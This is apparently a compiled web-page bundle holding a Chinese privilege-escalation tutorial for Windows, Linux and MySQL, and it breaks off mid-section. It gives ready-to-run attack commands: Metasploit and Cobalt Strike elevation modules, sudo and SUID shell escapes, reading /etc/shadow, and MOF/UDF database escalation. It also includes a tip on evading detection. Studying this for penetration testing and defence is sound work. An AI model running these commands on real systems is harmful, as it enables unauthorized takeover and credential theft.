(window.__LOADABLE_LOADED_CHUNKS__=window.__LOADABLE_LOADED_CHUNKS__||[]).push([[29],{171:function(e,a,t){"use strict";t.r(a),function(e){t.d(a,"default",(function(){return d}));var n,c=t(95),s=(t(139),t(0),t(96));function b(){return(b=Object.assign||function(e){for(var a=1;a<arguments.length;a++){var t=arguments[a];for(var n in t)Object.prototype.hasOwnProperty.call(t,n)&&(e[n]=t[n])}return e}).apply(this,arguments)}function o(e,a){if(null==e)return{};var t,n,c=function(e,a){if(null==e)return{};var t,n,c={},s=Object.keys(e);for(n=0;n<s.length;n++)t=s[n],a.indexOf(t)>=0||(c[t]=e[t]);return c}(e,a);if(Object.getOwnPropertySymbols){var s=Object.getOwnPropertySymbols(e);for(n=0;n<s.length;n++)t=s[n],a.indexOf(t)>=0||Object.prototype.propertyIsEnumerable.call(e,t)&&(c[t]=e[t])}return c}(n="undefined"!=typeof reactHotLoaderGlobal?reactHotLoaderGlobal.enterModule:void 0)&&n(e);"undefined"!=typeof reactHotLoaderGlobal&&reactHotLoaderGlobal.default.signature;var p,r,m=function(e){return function(a){return console.warn("Component "+e+" was not imported, exported, or provided by MDXProvider as global scope"),Object(s.b)("div",a)}},l={},N="wrapper";function d(e){var a=e.components,t=o(e,["components"]);return Object(s.b)(N,b({},l,t,{components:a,mdxType:"MDXLayout"}),Object(s.b)("h1",{className:"__internal",id:"提权的基础概念"},"提权的基础概念",Object(s.b)("a",b({parentName:"h1"},{href:"#%E6%8F%90%E6%9D%83%E7%9A%84%E5%9F%BA%E7%A1%80%E6%A6%82%E5%BF%B5","aria-hidden":!0,className:"anchor"}),"#")),Object(s.b)("p",null,Object(s.b)("strong",{parentName:"p"},"Windows上常见的权限分类：")),Object(s.b)("blockquote",null,Object(s.b)("p",{parentName:"blockquote"},"User：普通用户权限；"),Object(s.b)("p",{parentName:"blockquote"},"Administrator：管理员权限；"),Object(s.b)("p",{parentName:"blockquote"},"System：系统权限。")),Object(s.b)("p",null,Object(s.b)("strong",{parentName:"p"},"Linux上权限分类：")),Object(s.b)("blockquote",null,Object(s.b)("p",{parentName:"blockquote"},"User：普通用户权限；"),Object(s.b)("p",{parentName:"blockquote"},"www-data：Web服务的权限，比User还要低，一般通过Web漏洞获取的Webshell就是这个权限；"),Object(s.b)("p",{parentName:"blockquote"},"root：Linux系统最高权限。")),Object(s.b)("p",null,Object(s.b)("strong",{parentName:"p"},"纵向提权："),"低权限角色获取高权限角色的权限。"),Object(s.b)("p",null,Object(s.b)("strong",{parentName:"p"},"横向提权："),"在系统A中获取了系统B中同级别的角色权限。"),Object(s.b)("p",null,Object(s.b)("strong",{parentName:"p"},"常用的提权方法：")),Object(s.b)("p",null,"系统内核溢出漏洞提权、服务器中间件漏洞提权、数据库提权、其它第三方组件提权（利用率较高）。"),Object(s.b)("p",null,"利用windows系统错误配置提权（可信服务路径漏洞，组策略首选项等，利用率不高）。"),Object(s.b)("h1",{className:"__internal",id:"windows提权"},"Windows提权",Object(s.b)("a",b({parentName:"h1"},{href:"#windows%E6%8F%90%E6%9D%83","aria-hidden":!0,className:"anchor"}),"#")),Object(s.b)("p",null,Object(s.b)("strong",{parentName:"p"},"LOLBAS"),"（计划任务、文件传输、本地提权） ",Object(s.b)("a",b({parentName:"p"},{href:"https://lolbas-project.github.io/",target:"_blank"}),"https://lolbas-project.github.io/")," "),Object(s.b)("h2",{className:"__internal",id:"内核漏洞提权"},"内核漏洞提权",Object(s.b)("a",b({parentName:"h2"},{href:"#%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E%E6%8F%90%E6%9D%83","aria-hidden":!0,className:"anchor"}),"#")),Object(s.b)("table",null,Object(s.b)("thead",{parentName:"table"},Object(s.b)("tr",{parentName:"thead"},Object(s.b)("th",b({parentName:"tr"},{align:"left"}),"漏洞代号"),Object(s.b)("th",b({parentName:"tr"},{align:"left"}),"补丁编号"),Object(s.b)("th",b({parentName:"tr"},{align:"left"}),"适用平台"),Object(s.b)("th",b({parentName:"tr"},{align:"left"}),"用途"))),Object(s.b)("tbody",{parentName:"table"},Object(s.b)("tr",{parentName:"tbody"},Object(s.b)("td",b({parentName:"tr"},{align:"left"}),"MS14-058"),Object(s.b)("td",b({parentName:"tr"},{align:"left"}),"KB3000061"),Object(s.b)("td",b({parentName:"tr"},{align:"left"}),"03，08，12，Win7"),Object(s.b)("td",b({parentName:"tr"},{align:"left"}),"本地提权")),Object(s.b)("tr",{parentName:"tbody"},Object(s.b)("td",b({parentName:"tr"},{align:"left"}),"MS14-068"),Object(s.b)("td",b({parentName:"tr"},{align:"left"}),"KB3011780"),Object(s.b)("td",b({parentName:"tr"},{align:"left"}),"域控未安装补丁的域内，03，08，12，Win7"),Object(s.b)("td",b({parentName:"tr"},{align:"left"}),"域内提权")),Object(s.b)("tr",{parentName:"tbody"},Object(s.b)("td",b({parentName:"tr"},{align:"left"}),"MS15-051"),Object(s.b)("td",b({parentName:"tr"},{align:"left"}),"KB3057191"),Object(s.b)("td",b({parentName:"tr"},{align:"left"}),"03，08，12，Win7"),Object(s.b)("td",b({parentName:"tr"},{align:"left"}),"本地提权")),Object(s.b)("tr",{parentName:"tbody"},Object(s.b)("td",b({parentName:"tr"},{align:"left"}),"MS16-032"),Object(s.b)("td",b({parentName:"tr"},{align:"left"}),"KB3143141"),Object(s.b)("td",b({parentName:"tr"},{align:"left"}),"08 r2以后，12，Win7"),Object(s.b)("td",b({parentName:"tr"},{align:"left"}),"本地提权")),Object(s.b)("tr",{parentName:"tbody"},Object(s.b)("td",b({parentName:"tr"},{align:"left"}),"MS17-010"),Object(s.b)("td",b({parentName:"tr"},{align:"left"}),"KB4013389"),Object(s.b)("td",b({parentName:"tr"},{align:"left"}),"03，08，12，16，win7"),Object(s.b)("td",b({parentName:"tr"},{align:"left"}),"远程注入dll")))),Object(s.b)("p",null,Object(s.b)("strong",{parentName:"p"},"快速检测目标系统未打漏洞补丁")),Object(s.b)("div",{className:"rcpress-highlight","data-language":"bash"},Object(s.b)("pre",b({parentName:"div"},{className:"language-bash"}),Object(s.b)("code",b({parentName:"pre"},{className:"language-bash"}),"systeminfo ",Object(s.b)("span",b({parentName:"code"},{className:"token operator"}),">")," temp.txt",Object(s.b)("span",b({parentName:"code"},{className:"token operator"}),"&"),Object(s.b)("span",b({parentName:"code"},{className:"token punctuation"}),"("),"for %i ",Object(s.b)("span",b({parentName:"code"},{className:"token keyword"}),"in")," ",Object(s.b)("span",b({parentName:"code"},{className:"token punctuation"}),"("),"KB3000061 KB3011780 KB3057191 KB3143141 KB4013389",Object(s.b)("span",b({parentName:"code"},{className:"token punctuation"}),")")," ",Object(s.b)("span",b({parentName:"code"},{className:"token keyword"}),"do")," @type temp.txt",Object(s.b)("span",b({parentName:"code"},{className:"token operator"}),"|"),"@find /i  ",Object(s.b)("span",b({parentName:"code"},{className:"token string"}),'"%i"'),Object(s.b)("span",b({parentName:"code"},{className:"token operator"}),"||")," @echo %i Not Installed",Object(s.b)("span",b({parentName:"code"},{className:"token operator"}),"!"),Object(s.b)("span",b({parentName:"code"},{className:"token punctuation"}),")"),Object(s.b)("span",b({parentName:"code"},{className:"token operator"}),"&"),"del /f /q /a temp.txt"))),Object(s.b)("p",null,"补丁号根据自己需求加，利用的话",Object(s.b)("inlineCode",{parentName:"p"},"MSF"),"中有相关EXP或者自行搜索（",Object(s.b)("inlineCode",{parentName:"p"},"Github"),"， ",Object(s.b)("inlineCode",{parentName:"p"},"searchsploit")," ）"),Object(s.b)("h2",{className:"__internal",id:"利用msf提权"},"利用MSF提权",Object(s.b)("a",b({parentName:"h2"},{href:"#%E5%88%A9%E7%94%A8msf%E6%8F%90%E6%9D%83","aria-hidden":!0,className:"anchor"}),"#")),Object(s.b)("p",null,"在拿到一个Meterpreter的前提下进行"),Object(s.b)("div",{className:"rcpress-highlight","data-language":"bash"},Object(s.b)("pre",b({parentName:"div"},{className:"language-bash"}),Object(s.b)("code",b({parentName:"pre"},{className:"language-bash"}),Object(s.b)("span",b({parentName:"code"},{className:"token comment"}),"#根据漏洞编号，枚举系统中未安装带的补丁"),"\nuse post/windows/gather/enum_patches\n\n",Object(s.b)("span",b({parentName:"code"},{className:"token comment"}),"#快速识别系统中可利用的漏洞"),"\nuse post/multi/recon/local_exploit_suggester\n\n",Object(s.b)("span",b({parentName:"code"},{className:"token comment"}),"#ms14_058"),"\nuse exploit/windows/local/ms14_058_track_popup_menu\n\n",Object(s.b)("span",b({parentName:"code"},{className:"token comment"}),"#ms15_051"),"\nexploit/windows/local/ms15_051_client_copy_image\n\n",Object(s.b)("span",b({parentName:"code"},{className:"token comment"}),"#ms16_032"),"\nexploit/windows/local/ms16_032_secondary_logon_handle_privesc\n\n",Object(s.b)("span",b({parentName:"code"},{className:"token comment"}),"#ms17_010"),"\nuse exploit/windows/smb/ms17_010_eternalblue"))),Object(s.b)("p",null,Object(s.b)("strong",{parentName:"p"},"系统服务权限配置错误")," "),Object(s.b)("p",null,"如果meterpreter以管理员权限运行，该模块会创建一个新服务；"),Object(s.b)("p",null,"如果当前权限不允许创建服务，该模块会判断哪些文件或文件夹的权限有问题，并对其进行劫持。"),Object(s.b)("div",{className:"rcpress-highlight","data-language":"bash"},Object(s.b)("pre",b({parentName:"div"},{className:"language-bash"}),Object(s.b)("code",b({parentName:"pre"},{className:"language-bash"}),Object(s.b)("span",b({parentName:"code"},{className:"token comment"}),"#拿到一个本地管理员权限的meterpreter，可提升到SYSTEM"),"\nuse exploit/windows/local/service_permissions"))),Object(s.b)("p",null,Object(s.b)("strong",{parentName:"p"},"BypassUAC（只适用Win7）")),Object(s.b)("blockquote",null,Object(s.b)("p",{parentName:"blockquote"}," UAC（User Account Control，用户账户控制），在执行影计算机运行的操作时，会弹窗提示用户要求认证。 ")),Object(s.b)("div",{className:"rcpress-highlight","data-language":"bash"},Object(s.b)("pre",b({parentName:"div"},{className:"language-bash"}),Object(s.b)("code",b({parentName:"pre"},{className:"language-bash"}),Object(s.b)("span",b({parentName:"code"},{className:"token comment"}),"#拿到一个低权限本地用户的meterpreter"),"\nuse exploit/windows/local/bypassuac"))),Object(s.b)("h2",{className:"__internal",id:"利用cobalt-strike提权"},"利用Cobalt Strike提权",Object(s.b)("a",b({parentName:"h2"},{href:"#%E5%88%A9%E7%94%A8cobalt-strike%E6%8F%90%E6%9D%83","aria-hidden":!0,className:"anchor"}),"#")),Object(s.b)("p",null,"Cobalt Strike 附带了一些绕过 ",Object(s.b)("inlineCode",{parentName:"p"},"UAC")," 的攻击，但如果当前用户不是管理员(Administrator)， 攻击会失效。"),Object(s.b)("p",null,"Beacon默认回连时间（心跳时间）为60秒，为了更快的渗透修改成0秒，交互模式。"),Object(s.b)("div",{className:"rcpress-highlight","data-language":"bash"},Object(s.b)("pre",b({parentName:"div"},{className:"language-bash"}),Object(s.b)("code",b({parentName:"pre"},{className:"language-bash"}),Object(s.b)("span",b({parentName:"code"},{className:"token function"}),"sleep")," ",Object(s.b)("span",b({parentName:"code"},{className:"token number"}),"0"),"\t\n",Object(s.b)("span",b({parentName:"code"},{className:"token comment"}),"#心跳时间设快了容易被发现，实际攻击不建议设太快"),"\n\nshell ",Object(s.b)("span",b({parentName:"code"},{className:"token function"}),"whoami")))),Object(s.b)("p",null,Object(s.b)("strong",{parentName:"p"},"如果你有一个Administrator权限的Beacon，用以下命令提升到SYSTEM权限：")),Object(s.b)("p",null,"这个需要创建服务"),Object(s.b)("div",{className:"rcpress-highlight","data-language":"bash"},Object(s.b)("pre",b({parentName:"div"},{className:"language-bash"}),Object(s.b)("code",b({parentName:"pre"},{className:"language-bash"}),"elevate svc-exe test1（你的监听器）"))),Object(s.b)("p",null,Object(s.b)("strong",{parentName:"p"},"如果你是普通",Object(s.b)("inlineCode",{parentName:"strong"},"本地"),"用户权限，用以下命令提升到高权限")),Object(s.b)("p",null,"注意：如果是",Object(s.b)("inlineCode",{parentName:"p"},"域"),"用户会弹出认证窗口，不能提权"),Object(s.b)("div",{className:"rcpress-highlight","data-language":"bash"},Object(s.b)("pre",b({parentName:"div"},{className:"language-bash"}),Object(s.b)("code",b({parentName:"pre"},{className:"language-bash"}),"elevate uac-token-duplication test1"))),Object(s.b)("p",null,"然后可以用上边的",Object(s.b)("inlineCode",{parentName:"p"},"svc-exe"),"提权到SYSTEM"),Object(s.b)("h2",{className:"__internal",id:"c版的烂土豆（来自qax零队）"},"C#版的烂土豆（来自QAX零队）",Object(s.b)("a",b({parentName:"h2"},{href:"#c%E7%89%88%E7%9A%84%E7%83%82%E5%9C%9F%E8%B1%86%EF%BC%88%E6%9D%A5%E8%87%AAqax%E9%9B%B6%E9%98%9F%EF%BC%89","aria-hidden":!0,className:"anchor"}),"#")),Object(s.b)("p",null,"项目地址：",Object(s.b)("a",b({parentName:"p"},{href:"https://github.com/uknowsec/SweetPotato",target:"_blank"}),"https://github.com/uknowsec/SweetPotato")),Object(s.b)("p",null,"能在webshell下执行命令的版本 "),Object(s.b)("h1",{className:"__internal",id:"linux提权"},"Linux提权",Object(s.b)("a",b({parentName:"h1"},{href:"#linux%E6%8F%90%E6%9D%83","aria-hidden":!0,className:"anchor"}),"#")),Object(s.b)("p",null,Object(s.b)("strong",{parentName:"p"},"GTFOBins"),"（sudo滥用和SUID提权命令查询）",Object(s.b)("a",b({parentName:"p"},{href:"https://gtfobins.github.io/",target:"_blank"}),"https://gtfobins.github.io/")),Object(s.b)("h2",{className:"__internal",id:"密码复用"},"密码复用",Object(s.b)("a",b({parentName:"h2"},{href:"#%E5%AF%86%E7%A0%81%E5%A4%8D%E7%94%A8","aria-hidden":!0,className:"anchor"}),"#")),Object(s.b)("p",null," 如数据库、后台 web 密码，可能就是 root 密码"),Object(s.b)("h2",{className:"__internal",id:"内核溢出漏洞提权"},"内核溢出漏洞提权",Object(s.b)("a",b({parentName:"h2"},{href:"#%E5%86%85%E6%A0%B8%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E6%8F%90%E6%9D%83","aria-hidden":!0,className:"anchor"}),"#")),Object(s.b)("p",null,Object(s.b)("strong",{parentName:"p"},"信息收集")),Object(s.b)("div",{className:"rcpress-highlight","data-language":"text"},Object(s.b)("pre",b({parentName:"div"},{className:"language-text"}),Object(s.b)("code",b({parentName:"pre"},{className:"language-text"}),"uname -a#查看系统版本内核信息"))),Object(s.b)("p",null,Object(s.b)("strong",{parentName:"p"},"使用 ",Object(s.b)("inlineCode",{parentName:"strong"},"searchsploit")," 查找相关内核漏洞")),Object(s.b)("p",null,"下载地址：",Object(s.b)("a",b({parentName:"p"},{href:"https://github.com/offensive-security/exploitdb",target:"_blank"}),"https://github.com/offensive-security/exploitdb")),Object(s.b)("div",{className:"rcpress-highlight","data-language":"text"},Object(s.b)("pre",b({parentName:"div"},{className:"language-text"}),Object(s.b)("code",b({parentName:"pre"},{className:"language-text"}),"searchsploit linux 3.10 CentOS Linux 7"))),Object(s.b)("p",null,Object(s.b)("strong",{parentName:"p"},"或使用 ",Object(s.b)("inlineCode",{parentName:"strong"},"linux-exploit-suggester-2.pl")," 在目标机器上执行")),Object(s.b)("p",null,"下载地址：",Object(s.b)("a",b({parentName:"p"},{href:"https://github.com/jondonas/linux-exploit-suggester-2/blob/master/linux-exploit-suggester-2.pl",target:"_blank"}),"https://github.com/jondonas/linux-exploit-suggester-2/blob/master/linux-exploit-suggester-2.pl")),Object(s.b)("div",{className:"rcpress-highlight","data-language":"text"},Object(s.b)("pre",b({parentName:"div"},{className:"language-text"}),Object(s.b)("code",b({parentName:"pre"},{className:"language-text"}),"./linux-exploit-suggester-2.pl"))),Object(s.b)("h2",{className:"__internal",id:"sudo滥用"},"sudo滥用",Object(s.b)("a",b({parentName:"h2"},{href:"#sudo%E6%BB%A5%E7%94%A8","aria-hidden":!0,className:"anchor"}),"#")),Object(s.b)("p",null," ",Object(s.b)("inlineCode",{parentName:"p"},"/etc/sudoers"),"文件定义可以执行 sudo 的账户、定义某个应用程序用 root 访问、是否需要密码验证"),Object(s.b)("div",{className:"rcpress-highlight","data-language":"bash"},Object(s.b)("pre",b({parentName:"div"},{className:"language-bash"}),Object(s.b)("code",b({parentName:"pre"},{className:"language-bash"}),Object(s.b)("span",b({parentName:"code"},{className:"token function"}),"sudo")," -l\t",Object(s.b)("span",b({parentName:"code"},{className:"token comment"}),"#查看当前用户可以sudo的程序")))),Object(s.b)("p",null,Object(s.b)("strong",{parentName:"p"},"AWK：")),Object(s.b)("div",{className:"rcpress-highlight","data-language":"text"},Object(s.b)("pre",b({parentName:"div"},{className:"language-text"}),Object(s.b)("code",b({parentName:"pre"},{className:"language-text"}),"sudo awk 'BEGIN {system(\"/bin/sh\")}'\t#通过生成交互式系统外Shell序来脱离受限环境，需要普通用户的密码"))),Object(s.b)("p",null,Object(s.b)("strong",{parentName:"p"},"CURL：")),Object(s.b)("div",{className:"rcpress-highlight","data-language":"text"},Object(s.b)("pre",b({parentName:"div"},{className:"language-text"}),Object(s.b)("code",b({parentName:"pre"},{className:"language-text"}),"sudo curl file:///etc/shadow"))),Object(s.b)("h2",{className:"__internal",id:"suid提权"},"SUID提权",Object(s.b)("a",b({parentName:"h2"},{href:"#suid%E6%8F%90%E6%9D%83","aria-hidden":!0,className:"anchor"}),"#")),Object(s.b)("p",null,"SUID 是一种特殊的文件属性，它允许用户执行的文件以该文件的拥有者的身份运行【ls 查看时有 s 属性才支持 SUID】"),Object(s.b)("p",null,Object(s.b)("strong",{parentName:"p"},"查找正在系统上运行的所有SUID可执行文件")),Object(s.b)("div",{className:"rcpress-highlight","data-language":"bash"},Object(s.b)("pre",b({parentName:"div"},{className:"language-bash"}),Object(s.b)("code",b({parentName:"pre"},{className:"language-bash"}),Object(s.b)("span",b({parentName:"code"},{className:"token function"}),"find")," / -user root -perm -4000 -print ",Object(s.b)("span",b({parentName:"code"},{className:"token operator"}),Object(s.b)("span",b({parentName:"span"},{className:"token file-descriptor important"}),"2"),">"),"/dev/null"))),Object(s.b)("p",null,Object(s.b)("strong",{parentName:"p"},"比如发现了find")),Object(s.b)("div",{className:"rcpress-highlight","data-language":"bash"},Object(s.b)("pre",b({parentName:"div"},{className:"language-bash"}),Object(s.b)("code",b({parentName:"pre"},{className:"language-bash"}),Object(s.b)("span",b({parentName:"code"},{className:"token comment"}),"#随便新建一个文件，或利用已有文件"),"\n",Object(s.b)("span",b({parentName:"code"},{className:"token function"}),"touch")," abc\n\n",Object(s.b)("span",b({parentName:"code"},{className:"token comment"}),"#以SUID即root权限执行命令"),"\n",Object(s.b)("span",b({parentName:"code"},{className:"token function"}),"find")," abc -exec whomai ",Object(s.b)("span",b({parentName:"code"},{className:"token punctuation"}),"\\"),Object(s.b)("span",b({parentName:"code"},{className:"token punctuation"}),";")))),Object(s.b)("p",null,Object(s.b)("strong",{parentName:"p"},"nmap SUID提权")),Object(s.b)("div",{className:"rcpress-highlight","data-language":"bash"},Object(s.b)("pre",b({parentName:"div"},{className:"language-bash"}),Object(s.b)("code",b({parentName:"pre"},{className:"language-bash"}),Object(s.b)("span",b({parentName:"code"},{className:"token comment"}),"#2.02 to 5.21版本 用交互模式执行shell命令"),"\n",Object(s.b)("span",b({parentName:"code"},{className:"token function"}),"sudo")," nmap --interactive\t\t\nnmap",Object(s.b)("span",b({parentName:"code"},{className:"token operator"}),">")," ",Object(s.b)("span",b({parentName:"code"},{className:"token operator"}),"!"),"sh"))),Object(s.b)("h2",{className:"__internal",id:"su-root被禁止登录"},"su root被禁止登录",Object(s.b)("a",b({parentName:"h2"},{href:"#su-root%E8%A2%AB%E7%A6%81%E6%AD%A2%E7%99%BB%E5%BD%95","aria-hidden":!0,className:"anchor"}),"#")),Object(s.b)("blockquote",null,Object(s.b)("p",{parentName:"blockquote"},"拿到 root 密码，端口转发，代理，但防火墙禁止其他人登录 root；"),Object(s.b)("p",{parentName:"blockquote"},"用原来的低权限 shell，也无法 sudo 切换 root  "),Object(s.b)("p",{parentName:"blockquote"},"因为出于安全考虑，linux 要求用户必须从终端设备（tty）中输入密码，而不是标准输入（stdin）"),Object(s.b)("p",{parentName:"blockquote"},"所以 sudo 在你输入密码的时候本质上是读取了键盘，而不是读取 bash 里面输入的字符")),Object(s.b)("p",null,Object(s.b)("strong",{parentName:"p"},"利用python获取交互Shell")),Object(s.b)("div",{className:"rcpress-highlight","data-language":"bash"},Object(s.b)("pre",b({parentName:"div"},{className:"language-bash"}),Object(s.b)("code",b({parentName:"pre"},{className:"language-bash"}),"python -c ",Object(s.b)("span",b({parentName:"code"},{className:"token string"}),"'import pty;pty.spawn(\"/bin/sh\")'"),"\n",Object(s.b)("span",b({parentName:"code"},{className:"token function"}),"sudo")," ",Object(s.b)("span",b({parentName:"code"},{className:"token function"}),"su")))),Object(s.b)("h1",{className:"__internal",id:"数据库提权"},"数据库提权",Object(s.b)("a",b({parentName:"h1"},{href:"#%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83","aria-hidden":!0,className:"anchor"}),"#")),Object(s.b)("h2",{className:"__internal",id:"mysql数据库提权"},"MySQL数据库提权",Object(s.b)("a",b({parentName:"h2"},{href:"#mysql%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83","aria-hidden":!0,className:"anchor"}),"#")),Object(s.b)("h3",{className:"__internal",id:"mof提权"},"MOF提权",Object(s.b)("a",b({parentName:"h3"},{href:"#mof%E6%8F%90%E6%9D%83","aria-hidden":!0,className:"anchor"}),"#")),Object(s.b)("p",null,"MOF文件是mysql数据库的扩展文件（在c:/windows/system32/wbem/mof/nullevt.mof）"),Object(s.b)("p",null,"叫做”托管对象格式”，其作用是每隔五秒就会去监控进程创建和死亡"),Object(s.b)("p",null,Object(s.b)("strong",{parentName:"p"},"利用条件：")),Object(s.b)("blockquote",null,Object(s.b)("p",{parentName:"blockquote"},Object(s.b)("inlineCode",{parentName:"p"},"Windows<=2003")),Object(s.b)("p",{parentName:"blockquote"},"mysql在c:/windows/system32/wbem/mof目录有写权限"),Object(s.b)("p",{parentName:"blockquote"},"已知数据库root账号密码"),Object(s.b)("p",{parentName:"blockquote"},"数据库允许外连"),Object(s.b)("p",{parentName:"blockquote"},"secure_file_priv为空")),Object(s.b)("p",null,"当",Object(s.b)("inlineCode",{parentName:"p"},"secure_file_priv"),"的值没有具体值时，表示不对",Object(s.b)("inlineCode",{parentName:"p"},"MySQL"),"的导入|导出做限制，如果是null，表示",Object(s.b)("inlineCode",{parentName:"p"},"MySQL"),"不允许导入导出"),Object(s.b)("div",{className:"rcpress-highlight","data-language":"bash"},Object(s.b)("pre",b({parentName:"div"},{className:"language-bash"}),Object(s.b)("code",b({parentName:"pre"},{className:"language-bash"}),Object(s.b)("span",b({parentName:"code"},{className:"token comment"}),"#查看secure_file_priv的值"),"\nSHOW VARIABLES LIKE ",Object(s.b)("span",b({parentName:"code"},{className:"token string"}),'"secure_file_priv"'),Object(s.b)("span",b({parentName:"code"},{className:"token punctuation"}),";"),"\n\n",Object(s.b)("span",b({parentName:"code"},{className:"token comment"}),"#这个值可以在my.ini设置为空"),"\nsecure_file_priv ",Object(s.b)("span",b({parentName:"code"},{className:"token operator"}),"=")))),Object(s.b)("p",null,Object(s.b)("strong",{parentName:"p"},"提权原理：")),Object(s.b)("blockquote",null,Object(s.b)("p",{parentName:"blockquote"},"MOF文件既然每五秒就会执行，而且是系统权限；"),Object(s.b)("p",{parentName:"blockquote"},"我们通过mysql将文件写入一个MOF文件替换掉原有的MOF文件；"),Object(s.b)("p",{parentName:"blockquote"},"然后系统每隔五秒就会执行一次我们上传的MOF。"),Object(s.b)("p",{parentName:"blockquote"},"MOF当中有一段是vbs脚本，我们可以通过控制这段vbs脚本的内容让系统执行命令，进行提权。")),Object(s.b)("p",null,"这个提权方式条件非常严苛，数据库在system32写文件这个条件一般很难达到，而且较新的系统无法使用MOF提权。"),Object(s.b)("p",null," ",Object(s.b)("strong",{parentName:"p"},"MSF 下有Mof 提权模块")," "),Object(s.b)("p",null," 执行成功后会直接反弹一个 ",Object(s.b)("inlineCode",{parentName:"p"},"system"),"权限的meterpreter 。"),Object(s.b)("div",{className:"rcpress-highlight","data-language":"text"},Object(s.b)("pre",b({parentName:"div"},{className:"language-text"}),Object(s.b)("code",b({parentName:"pre"},{className:"language-text"}),"use exploit/windows/mysql/mysql_mof"))),Object(s.b)("h3",{className:"__internal",id:"udf提权"},"UDF提权",Object(s.b)("a",b({parentName:"h3"},{href:"#udf%E6%8F%90%E6%9D%83","aria-hidden":!0,className:"anchor"}),"#")),Object(s.b)("p",null,"UDF(user-defined function)是MySQL的一个拓展接口，也可称之为",Object(s.b)("strong",{parentName:"p"},"用户自定义函数")),Object(s.b)("p",null,"用户可以通过自己增加函数对mysql功能进行扩充，文件后缀为.dll"),Object(s.b)("p",null,Object(s.b)("strong",{parentName:"p"},"利用条件：")),Object(s.b)("blockquote",null,Object(s.b)("p",{parentName:"blockquote"},Object(s.b)("inlineCode",{parentName:"p"},"Server 2003、Windows XP、Windows 7")),Object(s.b)("p",{parentName:"blockquote"},"已知mysql中root的账号密码"),Object(s.b)("p",{parentName:"blockquote"},"mysql版本 < 5.2 , UDF导出到系统目录c:/windows/system32/"),Object(s.b)("p",{parentName:"blockquote"},"mysql版本 > 5.2 ，UDF导出到安装路径MySQL\\Lib\\Plugin\\"),Object(s.b)("p",{parentName:"blockquote"},"secure_file_priv为空")),Object(s.b)("p",null,Object(s.b)("strong",{parentName:"p"},"提权原理：")),Object(s.b)("blockquote",null,Object(s.b)("p",{parentName:"blockquote"},"利用root权限，创建带有调用cmd函数的’udf.dll’(动态链接库)"),Object(s.b)("p",{parentName:"blockquote"},"当我们把’udf.dll’导出指定文件夹引入Mysql时，其中的调用函数拿出来当作mysql的函数使用。"),Object(s.b)("p",{parentName:"blockquote"},"这样我们自定义的函数才被当作本机函数执行。"),Object(s.b)("p",{parentName:"blockquote"},"在使用CREAT FUNCITON调用dll中的函数后，mysql账号转化为system权限，从而提权")),Object(s.b)("p",null,"可以直接查询插件安装目录："),Object(s.b)("div",{className:"rcpress-highlight","data-language":"bash"},Object(s.b)("pre",b({parentName:"div"},{className:"language-bash"}),Object(s.b)("code",b({parentName:"pre"},{className:"language-bash"}),"show variables like %plugin%"))),Object(s.b)("p",null," 如果plugin不存在，可以用NTFS ADS流来创建文件夹并导入dll"),Object(s.b)("div",{className:"rcpress-highlight","data-language":"bash"},Object(s.b)("pre",b({parentName:"div"},{className:"language-bash"}),Object(s.b)("code",b({parentName:"pre"},{className:"language-bash"}),Object(s.b)("span",b({parentName:"code"},{className:"token comment"}),"#先找到Mysql的目录select @@basedir;#利用ADS流来创建plugin文件夹（测试并不能成功创建）select 'It is dll' into dumpfile 'C:\\\\phpStudy\\\\PHPTutorial\\\\MySQL\\\\lib\\\\plugin::$INDEX_ALLOCATION';")))),Object(s.b)("p",null,"网上流传的是在数据库中直接就能利用ADS流创建plugin文件夹，但我测试发现直接导入文件可以，并不能创建文件夹。"),Object(s.b)("p",null,"但是利用ADS流确实能创建文件夹，如以下命令（可以自己测试一下）"),Object(s.b)("div",{className:"rcpress-highlight","data-language":"bash"},Object(s.b)("pre",b({parentName:"div"},{className:"language-bash"}),Object(s.b)("code",b({parentName:"pre"},{className:"language-bash"}),Object(s.b)("span",b({parentName:"code"},{className:"token builtin class-name"}),"echo")," ",Object(s.b)("span",b({parentName:"code"},{className:"token number"}),"123")," ",Object(s.b)("span",b({parentName:"code"},{className:"token operator"}),">")," test::",Object(s.b)("span",b({parentName:"code"},{className:"token variable"}),"$INDEX_ALLOCATION"),"\n",Object(s.b)("span",b({parentName:"code"},{className:"token comment"}),"#这条命令会创建一个test文件夹")))),Object(s.b)("p",null,"所以我是用",Object(s.b)("inlineCode",{parentName:"p"},"Webshell"),"这样创建的plugin文件夹："),Object(s.b)("div",{className:"rcpress-highlight","data-language":"bash"},Object(s.b)("pre",b({parentName:"div"},{className:"language-bash"}),Object(s.b)("code",b({parentName:"pre"},{className:"language-bash"}),Object(s.b)("span",b({parentName:"code"},{className:"token builtin class-name"}),"echo")," ",Object(s.b)("span",b({parentName:"code"},{className:"token number"}),"123")," ",Object(s.b)("span",b({parentName:"code"},{className:"token operator"}),">")," C:",Object(s.b)("span",b({parentName:"code"},{className:"token punctuation"}),"\\"),"phpStudy",Object(s.b)("span",b({parentName:"code"},{className:"token punctuation"}),"\\"),"PHPTutorial",Object(s.b)("span",b({parentName:"code"},{className:"token punctuation"}),"\\"),"MySQL",Object(s.b)("span",b({parentName:"code"},{className:"token punctuation"}),"\\"),"lib",Object(s.b)("span",b({parentName:"code"},{className:"token punctuation"}),"\\"),"plugin::",Object(s.b)("span",b({parentName:"code"},{className:"token variable"}),"$INDEX_ALLOCATION")))),Object(s.b)("p",null,Object(s.b)("strong",{parentName:"p"},"有一个自动化工具"),"：",Object(s.b)("a",b({parentName:"p"},{href:"https://github.com/T3st0r-Git/HackMySQL",target:"_blank"}),"https://github.com/T3st0r-Git/HackMySQL")," "),Object(s.b)("div",{className:"rcpress-highlight","data-language":"bash"},Object(s.b)("pre",b({parentName:"div"},{className:"language-bash"}),Object(s.b)("code",b({parentName:"pre"},{className:"language-bash"}),Object(s.b)("span",b({parentName:"code"},{className:"token comment"}),"#上边的创建plugin目录步骤完成后直接利用即可"),"\npython root.py -a ",Object(s.b)("span",b({parentName:"code"},{className:"token number"}),"192.168"),".2.9 -proot -e ",Object(s.b)("span",b({parentName:"code"},{className:"token string"}),'"whoami"')))),Object(s.b)("p",null," ",Object(s.b)("strong",{parentName:"p"},"通过WebShell上传udf.php（这种方法数据库不用外连也可以）")," "),Object(s.b)("p",null," 